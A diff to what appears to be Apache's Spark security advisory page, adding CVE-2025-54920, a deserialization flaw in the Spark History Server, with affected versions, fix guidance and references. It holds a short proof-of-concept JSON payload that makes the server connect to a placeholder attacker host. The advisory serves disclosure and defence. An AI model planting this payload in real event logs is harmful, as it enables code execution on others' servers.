@@ -37,6 +37,44 @@ _Last updated: 2025-10-14T20:48:57.896Z_
 * https://lists.apache.org/thread/zrgyy9l85nm2c7vk36vr7bkyorg3w4qq
 
 
+## Spark History Server Code Execution Vulnerability ## { #CVE-2025-54920 }
+
+CVE-2025-54920 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-54920) [\[CVE json\]](./CVE-2025-54920.cve.json) [\[OSV json\]](./CVE-2025-54920.osv.json)
+
+
+
+_Last updated: 2026-03-14T09:01:48.596Z_
+
+### Affected
+
+* Apache Spark before 3.5.7
+* Apache Spark from 4.0.0 before 4.0.1
+
+
+### Description
+
+<p></p><p></p><p>This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.<br><br></p><p></p><p><b>Summary</b></p><p>Apache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.<br></p><p><b><br></b></p><p><b>Details</b></p><p>The vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with <code>@JsonTypeInfo.Id.CLASS</code> on <code>SparkListenerEvent</code> objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as <code>org.apache.hive.jdbc.HiveConnection</code>, which can perform network calls or other malicious actions during deserialization.</p>
+<p>The attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.</p><br><p></p><p></p><p><strong>Proof of Concept:</strong></p>1. Run Spark with event logging enabled, writing to a writable directory (<code>spark-logs</code>).<p></p><p>2. Inject the following JSON at the beginning of an event log file:
+</p><pre><div><div>{</div><div><code>  "Event": "org.apache.hive.jdbc.HiveConnection",
+  "uri": "jdbc:hive2://&lt;IP&gt;:&lt;PORT&gt;/",
+  "info": {
+    "hive.metastore.uris": "thrift://&lt;IP&gt;:&lt;PORT&gt;"
+  }
+}</code></div></div></pre><p></p><p>3. Start the Spark History Server with logs pointing to the modified directory.</p><p>4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.<br></p>
+<p></p><p></p><p><strong><br></strong></p><p><strong>Impact</strong></p><p>An attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.</p>
+<p></p><br>
+
+### References
+* https://github.com/apache/spark/pull/51312
+* https://github.com/apache/spark/pull/51323
+* https://issues.apache.org/jira/browse/SPARK-52381
+* https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s
+
+
+### Credits
+* Alexandre Pujol (Linagora) (finder)
+
+
 ## Shell command injection via Spark UI ## { #CVE-2023-32007 }
 
 CVE-2023-32007 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-32007) [\[CVE json\]](./CVE-2023-32007.cve.json) [\[OSV json\]](./CVE-2023-32007.osv.json)
